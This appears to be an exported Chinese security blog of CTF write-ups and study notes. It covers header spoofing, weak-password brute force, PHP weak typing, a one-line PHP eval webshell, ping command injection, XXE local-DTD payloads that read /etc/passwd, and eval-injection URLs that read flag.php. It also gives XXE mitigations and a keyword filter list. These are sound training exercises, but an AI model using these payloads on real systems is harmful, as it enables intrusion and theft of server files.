<h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p><strong>题目描述：</strong> X老师告诉小宁其实xff和referer是可以微操的<br>点开链接</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jjs7jj30al01n40o.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jjs7jj30al01n40o.jpg" class="lazyload"></a></p>
<p>使用Bp拦截修改<br>添加 xff 伪造ip</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:123.123.123.123</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jkw65j316n0iu42a.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jkw65j316n0iu42a.jpg" class="lazyload"></a></p>
<p>发现需求增加 请求需要从谷歌来源</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">referer:https://www.google.com</span><br></pre></td></tr></table></figure></div>
<p>得到flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jmjb2j31730gqtcm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jmjb2j31730gqtcm.jpg" class="lazyload"></a></p>
<hr>
<h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p><strong>题目描述：</strong>小宁写了一个登陆验证页面，随手就设了一个密码。<br>进入页面回显</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag5on9j30h60dhq2x.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag5on9j30h60dhq2x.jpg" class="lazyload"></a></p>
<p>随手尝试点击login 回显</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162afyp9kj30am04wq2t.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162afyp9kj30am04wq2t.jpg" class="lazyload"></a></p>
<p>查看源代码，发现tips</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag2o0hj30mz099t8s.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag2o0hj30mz099t8s.jpg" class="lazyload"></a></p>
<p>尝试弱口令爆破</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag0zwfj30z60lamyv.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag0zwfj30z60lamyv.jpg" class="lazyload"></a></p>
<p>设置为密码爆破</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag0tapj30uy0hv75r.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag0tapj30uy0hv75r.jpg" class="lazyload"></a></p>
<p>添加字典后 <strong>attack start</strong></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162afzmqaj30fh07u0sx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162afzmqaj30fh07u0sx.jpg" class="lazyload"></a></p>
<p>测试后发现 <code>123456</code> 的长度不同，查看后得到flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag279sj30qr091gma.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag279sj30qr091gma.jpg" class="lazyload"></a></p>
<hr>
<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p><strong>题目描述：</strong>小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line">    <span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>前半段可以用：</p>
<blockquote>
<p><a href="http://111.198.29.45:30668/index.php?a=a">http://111.198.29.45:30668/index.php?a=a</a></p>
</blockquote>
<p>同理 <code>var_dump(&#39;1234a&#39; == 1234)</code><br>结果为 <code>true</code> ,php的弱类型比较会忽略字母a</p>
<p>所以后半段可以用：</p>
<blockquote>
<p><a href="http://111.198.29.45:30668/index.php?a=a&b=1235a">http://111.198.29.45:30668/index.php?a=a&amp;b=1235a</a></p>
</blockquote>
<hr>
<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p><strong>题目描述：</strong>小宁百度了php一句话,觉着很有意思,并且把它放在index.php里.</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmdrbfj30aj037q2z.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmdrbfj30aj037q2z.jpg" class="lazyload"></a></p>
<p><code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code> 一句话木马放置于 <code>index.php</code>,采用菜刀链接<br>查看文件发现 <code>flag.txt</code> ,打开得到flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmf5taj30k20890sx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmf5taj30k20890sx.jpg" class="lazyload"></a></p>
<hr>
<h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p><strong>题目描述：</strong>小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p>
<p>一个简单的命令执行漏洞<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmdc24j30c6071aa1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmdc24j30c6071aa1.jpg" class="lazyload"></a></p>
<p>尝试 <code>ping IP | ls</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmfeypj30h60axaa2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmfeypj30h60axaa2.jpg" class="lazyload"></a></p>
<p>在 <code>ping IP | ls ../../../</code> 发现 home<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmdte1j30kl0gnglr.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmdte1j30kl0gnglr.jpg" class="lazyload"></a></p>
<p>然后发现 <code>flag.txt</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmcyobj30jv04at8k.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmcyobj30jv04at8k.jpg" class="lazyload"></a><br>然后就 <code>cat</code> 抓取就好了<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmd06zj30ix02n3yf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmd06zj30ix02n3yf.jpg" class="lazyload"></a></p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE漏洞学习</title>
    <url>/yakko117/2020/03/18/XXElearn/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>最近莫名开始倒时差，每天下午5点多开始犯困，然后一睡就睡到了半夜起来<br>只会做题是不行的，要去学习原理，而不是纯粹做个脚本小子</p>
<span id="more"></span>

<h1 id="基础知识参考文档"><a href="#基础知识参考文档" class="headerlink" title="基础知识参考文档"></a>基础知识参考文档</h1><p><a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm">XML类型声明原文档</a><br><a href="https://www.cnblogs.com/zhaijiahui/p/9147595.html">XXE漏洞学习</a><br><a href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a><br><a href="https://zhuanlan.zhihu.com/p/88125925">googleCTF2019关于xxe的题解</a><br><a href="https://blog.zsec.uk/blind-xxe-learning/">盲注技巧</a><br><a href="https://xz.aliyun.com/t/6829">PHP与JAVA之XXE漏洞详解与审计</a></p>
<h1 id="几个需要注意的点"><a href="#几个需要注意的点" class="headerlink" title="几个需要注意的点"></a>几个需要注意的点</h1><p>现在有<code>回显的XXE</code> 已经很少了,Blind-XXE重点在于如何将数据传输出来。</p>
<p>以往很多文章通过引入外部服务器或外部dtd文件,可以实现 <code>OOB(out-of-band)</code> 信息传递和通过构造dtd从错误信息获取数据。</p>
<h2 id="记得改"><a href="#记得改" class="headerlink" title="记得改"></a>记得改</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/xml</span><br></pre></td></tr></table></figure></div>

<h2 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/xml_1.png" data-fancybox="group" data-caption="pro" class="fancybox"><img alt="pro" title="pro" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/xml_1.png" class="lazyload"></a></p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><p>如果目标主机的防火墙十分严格,不允许我们请求外网服务器dtd,那么我们可以通过引入本地dtd文件实现XXE。</p>
<p><font color="6495ED">ubuntu系统</font>自带 <code>/usr/share/yelp/dtd/docbookx.dtd</code> 文件</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div></div><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">para1</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">para</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;para2;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;id;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="使用开发语言提供的禁用外部实体的方法"><a href="#使用开发语言提供的禁用外部实体的方法" class="headerlink" title="使用开发语言提供的禁用外部实体的方法"></a>使用开发语言提供的禁用外部实体的方法</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div>


<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></div>

<h2 id="过滤关键词："><a href="#过滤关键词：" class="headerlink" title="过滤关键词："></a>过滤关键词：</h2><ul>
<li><code>&lt;!DOCTYPE</code> </li>
<li><code>&lt;!ENTITY</code></li>
<li><code>SYSTEM</code></li>
<li><code>PUBLIC</code></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>一道ctf题小结(还是自己能力不行)</title>
    <url>/yakko117/2019/03/10/bugku%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BugkuCTF-本地包含"><a href="#BugkuCTF-本地包含" class="headerlink" title="BugkuCTF 本地包含"></a>BugkuCTF 本地包含</h1><p><a href="http://120.24.86.145:8003/">题目链接</a><br>怎么说呢，虽说不算难，但是考的基础知识还是值得探讨分析一下的</p>
<span id="more"></span>

<h3 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs277yv3j30cz059t94.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs277yv3j30cz059t94.jpg" class="lazyload"></a></p>
<p>a. <code>include&quot;flag.php&quot;</code>; 把我们想要的弗拉格藏了起来，哼<br>b. <code>$_request</code>这个变量对 <code>GET</code> 、<code>POST</code> 都能接受，但这个全局变量在运行时修改后者不会影响前者（反之亦然）<br>c. 以<code>get</code> &#x2F; <code>post</code> &#x2F; <code>cookies</code> 等方式把以hello为名的东西提交过来<br>d. eval函数把字符串当作命令直接执行</p>
<hr>
<p>首先选择 <code>get</code> 传值<br>根据最基本注入 <code>&#39;&#39;</code> 引号闭合的思路，很容易就想到了利用括号，毕竟，<code>eval</code> 中是执行的代码段。</p>
<p>测试一下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:8003/index.php?hello=%201);print_r(2</span><br></pre></td></tr></table></figure></div>
<p>代码结合起来就是：</p>
<pre><code>eval( &quot;var_dump(1);print_r(2);&quot;); 
</code></pre>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs278b65j30hy05lwep.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs278b65j30hy05lwep.jpg" class="lazyload"></a><br>发现还行，既然执行没问题，就可以构造名字为hello的攻击命令，把flag.php里面的代码以数组形式输出出来。</p>
<p>最后在url里如此构造攻击命令：</p>
<pre><code>?hello=file(&quot;flag.php&quot;)
</code></pre>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs2798yvj31ej065wfd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs2798yvj31ej065wfd.jpg" class="lazyload"></a></p>
<pre><code>?hello=get_file_contents(&#39;flag.php&#39;) // 或者这种
</code></pre>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs2798yvj31ej065wfd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs2798yvj31ej065wfd.jpg" class="lazyload"></a></p>
<pre><code>?hello=1);print_r(file(&quot;./flag.php&quot;)
</code></pre>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs279ecpj314c051gm6.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs279ecpj314c051gm6.jpg" class="lazyload"></a></p>
<p>除了直接将 <strong>flag.php</strong> 文件读入变量 <code>hello</code> 中；还可利用 <code>eval()</code> 的命令执行漏洞，使用hello构造payload：</p>
<pre><code>?hello=1);show_source(%27flag.php%27);var_dump(3
</code></pre>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs278kv4j30o808hdgc.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs278kv4j30o808hdgc.jpg" class="lazyload"></a></p>
<hr>
<h3 id="注入理解"><a href="#注入理解" class="headerlink" title="注入理解"></a>注入理解</h3><p>file()函数的作用是读取文件，然后以数组的形式返回<br>eval函数中， <code>&quot; &quot;</code> 内部为代码， <code>//</code> 只在代码中起作用，相当于只注释了<code>)</code>；<br>然后我们来分析一下 <code>file_get_contents</code> 与 <code>file</code> 及 <code>var_dump</code>，<code>print_r</code> 和 <code>echo</code> </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xw55a4jyj30ao043mx9.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xw55a4jyj30ao043mx9.jpg" class="lazyload"></a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xw55abpfj30bq05v0t5.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xw55abpfj30bq05v0t5.jpg" class="lazyload"></a></p>
<p>返回值如下</p>
<pre><code>Array ( [0] =&gt; icnlude &quot;flag.php&quot;; [2] =&gt; $a = @$_Request[&#39;hello&#39;]; [3] =&gt; eval(&quot;var_dump($a);&quot;); [4] =&gt; show_source(__file__); [5] =&gt; ?&gt; )
</code></pre>
<p>后面的坑再添吧</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay9</title>
    <url>/yakko117/2022/01/03/buuctfDay09/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>很久没更新了，因为各种原因摸了一年多的鱼</p>
<h1 id="NPUCTF2020-web🐕"><a href="#NPUCTF2020-web🐕" class="headerlink" title="[NPUCTF2020] web🐕"></a>[NPUCTF2020] web🐕</h1><p>首先先看一下题目</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">我摊牌了，就是懒得写前端</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="variable">$key</span>);    <span class="comment">//定义密钥</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;IV&quot;</span>,<span class="string">&quot;6666666666666666&quot;</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;BR&quot;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:./index.php?source=1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span>(<span class="params"><span class="variable">$iv</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;--------encrypt---------&quot;</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;IV:&#x27;</span>.<span class="variable">$iv</span>.BR;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span>(<span class="params"><span class="variable">$iv</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,<span class="variable">$iv</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;False&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$iv</span> = IV;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$flag</span>;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">aes_encrypt</span>(<span class="variable">$iv</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&quot;decrypt&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$iv</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;iv&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">aes_decrypt</span>(<span class="variable">$iv</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我摊牌了，就是懒得写前端&quot;</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]==<span class="number">1</span>)<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h2><ul>
<li>PHP AES 加密</li>
<li>CBC字节翻转攻击 <a href="https://www.smi1e.top/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%92%8Cpadding-oracle/">微笑师傅的分析讲解</a> 以及 <a href="https://wooyun.js.org/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html">wooyun的技术分析帖</a></li>
<li>还有这篇 <a href="https://www.freebuf.com/articles/web/15504.html">Padding Oracle攻击的分析和思考（详细）</a></li>
</ul>
